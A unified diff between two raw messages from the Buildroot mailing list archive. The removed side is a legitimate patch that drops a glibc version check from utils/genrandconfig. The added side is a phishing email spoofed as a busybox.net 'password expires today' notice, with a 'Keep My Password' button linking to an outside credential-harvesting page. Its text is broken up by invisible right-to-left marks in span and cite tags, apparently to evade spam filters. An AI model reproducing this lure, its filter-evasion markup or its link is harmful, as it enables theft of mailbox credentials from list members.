@@ -4,92 +4,57 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id E80F2C25B75
-	for <buildroot@archiver.kernel.org>; Sat,  1 Jun 2024 01:19:01 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id F1F0CC25B75
+	for <buildroot@archiver.kernel.org>; Sat,  1 Jun 2024 01:29:49 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 5B91060752;
-	Sat,  1 Jun 2024 01:19:01 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id 95F1F610F5;
+	Sat,  1 Jun 2024 01:29:49 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp3.osuosl.org ([127.0.0.1])
  by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id M8WjBpMz3Tj8; Sat,  1 Jun 2024 01:19:00 +0000 (UTC)
+ id 3GfOl5tyiXZ9; Sat,  1 Jun 2024 01:29:48 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 5206F6117F
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org A61D2611B3
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 5206F6117F;
-	Sat,  1 Jun 2024 01:19:00 +0000 (UTC)
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by ash.osuosl.org (Postfix) with ESMTP id A17491BF4DB
- for <buildroot@lists.busybox.net>; Sat,  1 Jun 2024 01:18:58 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id A61D2611B3;
+	Sat,  1 Jun 2024 01:29:48 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 30E721D598C
+ for <buildroot@lists.busybox.net>; Sat,  1 Jun 2024 01:29:47 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id 8BB5041490
- for <buildroot@lists.busybox.net>; Sat,  1 Jun 2024 01:18:58 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id 2A774833DB
+ for <buildroot@lists.busybox.net>; Sat,  1 Jun 2024 01:29:47 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id I4CLquuVWXsp for <buildroot@lists.busybox.net>;
- Sat,  1 Jun 2024 01:18:57 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom;
- client-ip=2607:f8b0:4864:20::d2e; helo=mail-io1-xd2e.google.com;
- envelope-from=james.hilliard1@gmail.com; receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp4.osuosl.org 88DDF41481
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 88DDF41481
-Received: from mail-io1-xd2e.google.com (mail-io1-xd2e.google.com
- [IPv6:2607:f8b0:4864:20::d2e])
- by smtp4.osuosl.org (Postfix) with ESMTPS id 88DDF41481
- for <buildroot@buildroot.org>; Sat,  1 Jun 2024 01:18:57 +0000 (UTC)
-Received: by mail-io1-xd2e.google.com with SMTP id
- ca18e2360f4ac-7eb0116faf8so35199939f.3
- for <buildroot@buildroot.org>; Fri, 31 May 2024 18:18:57 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1717204736; x=1717809536;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
- :reply-to;
- bh=V2lA1gBumXREfyfYmqCTrrTr6KZFS3d9nYy7aUuulFM=;
- b=a49bshb8WWe04zTlTpBLWgZVA/3b54i64gDkA3o1z2J7jDDOJpbM4G6KNUFlDXug66
- peKd56/bDClf5fKY8KEq6vfVSluuufQEVrRGZgtm0bufeJeZiu3bC7hefdwFXDTXIUrE
- 2QpVBhOZcVmUO7uVFb4Hd8bBf9rJaixawwdnwUjC7rmVYLBo2f3jTwa3h9aAs58KGy2a
- 6V0Dvcsij/N9qlwzi9ElFUJWsfSamw3iWz0Ec5LXGNWagj2n9UlUSBRNmMVKN5GRRTTr
- YELpnrDml/P7IeLevAGiI9mt7+Pl8FhXVayxkEKaE0rK4LY06Ud9CBLay+XGS5O8Ovyj
- 1s2w==
-X-Gm-Message-State: AOJu0YycQ0fHp+VFKoz+V0O3gP7IyjzIDcy3frr4DHg57620JWvnWabX
- /nAim15CABQ1LKuYzQxi7QcwakeIFDf5vc0VYKGOJetAJsDkx/nj4454Og==
-X-Google-Smtp-Source: AGHT+IHzFxd6+0V8O4fFVDUQuAU/3b67dPdchIobJ26HoSs+yxrAZIXQ2s93apDn5xlahz3pRiCmGQ==
-X-Received: by 2002:a05:6602:3fc8:b0:7e1:7d63:887 with SMTP id
- ca18e2360f4ac-7eafff1f4f1mr447439739f.18.1717204736171; 
- Fri, 31 May 2024 18:18:56 -0700 (PDT)
-Received: from james-x399.localdomain (97-118-179-167.hlrn.qwest.net.
- [97.118.179.167]) by smtp.gmail.com with ESMTPSA id
- 8926c6da1cb9f-4b566adecedsm331616173.27.2024.05.31.18.18.55
- (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Fri, 31 May 2024 18:18:55 -0700 (PDT)
-From: James Hilliard <james.hilliard1@gmail.com>
-To: buildroot@buildroot.org
-Date: Fri, 31 May 2024 19:17:33 -0600
-Message-Id: <20240601011733.2964473-1-james.hilliard1@gmail.com>
-X-Mailer: git-send-email 2.34.1
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id FAN_Bn_C4zXQ for <buildroot@lists.busybox.net>;
+ Sat,  1 Jun 2024 01:29:46 +0000 (UTC)
+X-Greylist: delayed 42825 seconds by postgrey-1.37 at util1.osuosl.org;
+ Sat, 01 Jun 2024 01:29:45 UTC
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 97A3D832DB
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 97A3D832DB
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=91.192.172.174;
+ helo=mx1.mimport.ru; envelope-from=noreply@busybox.net; receiver=<UNKNOWN> 
+Received: from mx1.mimport.ru (unknown [91.192.172.174])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 97A3D832DB
+ for <buildroot@busybox.net>; Sat,  1 Jun 2024 01:29:44 +0000 (UTC)
+Received: from [194.169.175.152] by mx1.mimport.ru (MDaemon PRO v13.0.6)
+ with ESMTP id md50001299701.msg
+ for <buildroot@busybox.net>; Thu, 09 May 2024 07:50:46 +0700
+X-Authenticated-Sender: test123@mimport.ru
+X-MDRemoteIP: 194.169.175.152
+X-Return-Path: noreply@busybox.net
+X-Envelope-From: noreply@busybox.net
+X-MDaemon-Deliver-To: buildroot@busybox.net
+From: busybox.net  noreply@busybox.net
+To: buildroot@busybox.net
+Date: 8 May 2024 17:49:01 -0700
+Message-ID: <20240508174900.9884493637C925B1@busybox.net>
 MIME-Version: 1.0
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=gmail.com; s=20230601; t=1717204736; x=1717809536; darn=buildroot.org;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:from:to:cc:subject:date:message-id:reply-to;
- bh=V2lA1gBumXREfyfYmqCTrrTr6KZFS3d9nYy7aUuulFM=;
- b=Iu+JJZzQkU6oD8wJq+h/q96A7p2XEVfd3FxtxwpW+mFxGjGv6PgRom/frjEvC0MOag
- rybmuoF0g2fGb9dmsNOEfyajNQthmhmzBql1ux0vyCQjt4b/C+s2r+Rs7fqhxrjcmdw4
- 8iK7W6tp8BNY7ncyP2ckry3pctmnVjS6piM5KpJt2kWAfaOUk8MA3569ZzU/vVMrBjZU
- bckjBbP0q4sCmz/YQxMsSYQb+XLOlVIZ1PpwCaG1ntn0ZqktT2xZqVnpyJFcrs3AMr+F
- 3cl5gASpTEBxZgkcIxD2fTiu51qkZBf6lfsBr3qHL27m0Q/+tH9uu9V2pCAUVqhYxt81
- J9ww==
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dmarc=pass (p=none dis=none)
- header.from=gmail.com
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (2048-bit key,
- unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256
- header.s=20230601 header.b=Iu+JJZzQ
-Subject: [Buildroot] [PATCH 1/1] utils/genrandconfig: drop glibc Linaro
- toolchain version check
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] busybox.net server notification service!!
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -101,65 +66,112 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: James Hilliard <james.hilliard1@gmail.com>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============7796252676564854993=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-It has been well over 10 years since glibc 2.14 was released, I don't
-think we need this check anymore.
+--===============7796252676564854993==
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
 
-The distutils module is no longer bundled with python 3.12 so this
-eliminates the need to install additional python modules under python
-3.12.
+<!DOCTYPE html><html><head></head><body><div style=3D "FONT-SIZE: 12pt; FON=
+T-FAMILY: Calibri,Arial,Helvetica,sans-serif; COLOR: rgb(0,0,0)"><br></div>=
+<div><div><div><div><table cellspacing=3D"0" cellpadding=3D"0" align=3D"cen=
+ter" border=3D"0"><tbody><tr><td style=3D "MAX-WIDTH: 550px; BORDER-TOP: #e=
+6e6e6 1px solid; BORDER-RIGHT: #e6e6e6 1px solid; WIDTH: 755px; BORDER-BOTT=
+OM: #e6e6e6 1px solid; BORDER-LEFT: #e6e6e6 1px solid; border-radius: 2px">=
+<table style=3D "MAX-WIDTH: 550px; BORDER-TOP-COLOR: #e6e6e6; BORDER-LEFT-C=
+OLOR: #e6e6e6; BORDER-BOTTOM-COLOR: #e6e6e6; BORDER-RIGHT-COLOR: #e6e6e6; B=
+ACKGROUND-COLOR: #ffffff; object-fit: contain" cellspacing=3D"0" cellpaddin=
+g=3D"0" width=3D"100%" align=3D"center" border=3D "0"><tbody><tr height=3D"=
+319"><td style=3D "PADDING-TOP: 22px; PADDING-LEFT: 21px; PADDING-RIGHT: 30=
+px"><table style=3D"WIDTH:98%;MIN-WIDTH:150px" cellspacing=3D"0" cellpaddin=
+g=3D"0" border=3D"0"><tbody><tr height=3D"301"><td><p align=3D"center"><spa=
+n style=3D "FONT-SIZE: 24pt; COLOR: #eb1d1d"><font color=3D"#0072C6" size=
+=3D "7">busybox.net</font></span><br><br>Yo<span class=3D"x_ciass">&#8207;&=
+#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/2023monday860">&#8207;&=
+#8207;&#8207;</cite></span>ur Em<span class=3D"x_ciass">&#8207;&#8207;&#820=
+7;<cite id=3D"x_88f2020f12s43t50jan23/01/2023monday860">&#8207;&#8207;&#820=
+7;</cite></span>a<span class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x=
+_88f2020f12s43t50jan23/01/2023monday860">&#8207;&#8207;&#8207;</cite></span=
+>il<span class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43=
+t50jan23/01/2023monday860">&#8207;&#8207;&#8207;</cite></span> pas<span cla=
+ss=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/=
+2023monday860">&#8207;&#8207;&#8207;</cite></span>swo<span class=3D"x_ciass=
+">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/2023monday860=
+">&#8207;&#8207;&#8207;</cite></span>rd f<span class=3D"x_ciass">&#8207;&#8=
+207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/2023monday860">&#8207;&#8=
+207;&#8207;</cite></span>or &nbsp;<font color=3D"#2c74d3">buildroot@busybox=
+=2Enet</font>&nbsp; i<span class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=
+=3D"x_88f2020f12s43t50jan23/01/2023monday860">&#8207;&#8207;&#8207;</cite><=
+/span>s<span class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f1=
+2s43t50jan23/01/2023monday860">&#8207;&#8207;&#8207;</cite></span> set to<s=
+pan class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50ja=
+n23/01/2023monday860">&#8207;&#8207;&#8207;</cite></span> ex<span class=3D"=
+x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/2023mo=
+nday860">&#8207;&#8207;&#8207;</cite></span>p<span class=3D"x_ciass">&#8207=
+;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/2023monday860">&#8207=
+;&#8207;&#8207;</cite></span>ire t<span class=3D"x_ciass">&#8207;&#8207;&#8=
+207;<cite id=3D"x_88f2020f12s43t50jan23/01/2023monday860">&#8207;&#8207;&#8=
+207;</cite></span>o<span class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D=
+"x_88f2020f12s43t50jan23/01/2023monday860">&#8207;&#8207;&#8207;</cite></sp=
+an>d<span class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s4=
+3t50jan23/01/2023monday860">&#8207;&#8207;&#8207;</cite></span>a<span class=
+=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/20=
+23monday860">&#8207;&#8207;&#8207;</cite></span>y<span class=3D"x_ciass">&#=
+8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/2023monday860">&#=
+8207;&#8207;&#8207;</cite></span>.<br><br>buildroot@busybox.net<br><br></p>=
+<table style=3D "MAX-WIDTH: 200px; HEIGHT: 24px; WIDTH: 143px; BORDER-COLLA=
+PSE: collapse; TABLE-LAYOUT: fixed; BORDER-SPACING: 0px; MARGIN: 0px auto" =
+cellspacing=3D"0" cellpadding=3D"0" align=3D"center" border=3D"0"><tbody><t=
+r style=3D "FONT-SIZE: 0px; BORDER-COLLAPSE: collapse; LINE-HEIGHT: 0px"><t=
+d style=3D "WIDTH: 175px; WHITE-SPACE: normal; TEXT-ALIGN: center; BACKGROU=
+ND-COLOR: #2d5ba7"><a style=3D "FONT-SIZE: 13px; TEXT-DECORATION: none; BOR=
+DER-TOP: #2d5ba7 10px solid; FONT-FAMILY: sans-serif; BORDER-RIGHT: #2d5ba7=
+ 10px solid; VERTICAL-ALIGN: baseline; BACKGROUND: #2d5ba7 left top; BORDER=
+-BOTTOM: #2d5ba7 10px solid; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; =
+TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 8px; BORDER-LEFT: #2d5b=
+a7 10px solid; MARGIN: 0px; DISPLAY: block; LINE-HEIGHT: 1.1; PADDING-RIGHT=
+: 8px" href=3D'https://sivakrishnas.com/Autopage/Autopage/?login=3Dbuildroo=
+t@busybox.net'>Ke<span class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x=
+_88f2020f12s43t50jan23/01/2023monday860">&#8207;&#8207;&#8207;</cite></span=
+>ep M<span class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s=
+43t50jan23/01/2023monday860">&#8207;&#8207;&#8207;</cite></span>y Pa<span c=
+lass=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/0=
+1/2023monday860">&#8207;&#8207;&#8207;</cite></span>ss<span class=3D"x_cias=
+s">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/2023monday86=
+0">&#8207;&#8207;&#8207;</cite></span>wo<span class=3D"x_ciass">&#8207;&#82=
+07;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/2023monday860">&#8207;&#82=
+07;&#8207;</cite></span>rd</a></td></tr></tbody></table><span style=3D "FON=
+T-FAMILY: 'Segoe UI',Tahoma,Geneva,Verdana,sans-serif"><span style=3D"FONT-=
+SIZE:11pt"><br style=3D"FONT-SIZE:12pt"><br style=3D"FONT-SIZE:12pt"></span=
+></span></td></tr></tbody></table></td></tr>
 
-Signed-off-by: James Hilliard <james.hilliard1@gmail.com>
----
- utils/genrandconfig | 19 -------------------
- 1 file changed, 19 deletions(-)
 
-diff --git a/utils/genrandconfig b/utils/genrandconfig
-index b838dda34d..0889be0d43 100755
---- a/utils/genrandconfig
-+++ b/utils/genrandconfig
-@@ -25,8 +25,6 @@ import os
- from random import randint
- import sys
- import traceback
--from distutils.version import StrictVersion
--import platform
- 
- 
- class SystemInfo:
-@@ -166,23 +164,6 @@ async def is_toolchain_usable(configfile, config):
-             print("      Missing: %s" % toolchainline.strip(), file=sys.stderr)
-             return False
- 
--    # The latest Linaro toolchains on x86-64 hosts requires glibc
--    # 2.14+ on the host.
--    if platform.machine() == 'x86_64':
--        if 'BR2_TOOLCHAIN_EXTERNAL_LINARO_ARM=y\n' in configlines or \
--           'BR2_TOOLCHAIN_EXTERNAL_LINARO_AARCH64=y\n' in configlines or \
--           'BR2_TOOLCHAIN_EXTERNAL_LINARO_AARCH64_BE=y\n' in configlines or \
--           'BR2_TOOLCHAIN_EXTERNAL_LINARO_ARMEB=y\n' in configlines:
--            proc = await asyncio.create_subprocess_exec(
--                'ldd', '--version', stdout=asyncio.subprocess.PIPE)
--            ldd_version_output, _ = await proc.communicate()
--            if proc.returncode:
--                return False
--            glibc_version = ldd_version_output.decode().splitlines()[0].split()[-1]
--            if StrictVersion('2.14') > StrictVersion(glibc_version):
--                print("WARN: ignoring the Linaro ARM toolchains because too old host glibc", file=sys.stderr)
--                return False
--
-     return True
- 
- 
--- 
-2.34.1
+</tbody></table><table style=3D "BORDER-TOP: #e6e6e6 1px solid; BORDER-RIGH=
+T: #e6e6e6 1px solid; BORDER-BOTTOM: #e6e6e6 1px solid; BORDER-LEFT: #e6e6e=
+6 1px solid" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%"><tbody><tr =
+height=3D"54"><td style=3D "WIDTH: 713px; PADDING-BOTTOM: 33px; PADDING-TOP=
+: 10px; PADDING-LEFT: 33px; PADDING-RIGHT: 33px; BACKGROUND-COLOR: #f8f8f9"=
+><p style=3D"FONT-SIZE:x-small" align=3D"center">=A9 2024 busybox.net. All
+ri<span class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t=
+50jan23/01/2023monday860">&#8207;&#8207;&#8207;</cite></span>ghts res<span =
+class=3D"x_ciass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/=
+01/2023monday860">&#8207;&#8207;&#8207;</cite></span>erv<span class=3D"x_ci=
+ass">&#8207;&#8207;&#8207;<cite id=3D"x_88f2020f12s43t50jan23/01/2023monday=
+860">&#8207;&#8207;&#8207;</cite></span>ed.</p></td></tr></tbody></table></=
+td></tr></tbody></table></div></div></div></div></body></html>
+
+
+--===============7796252676564854993==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============7796252676564854993==--
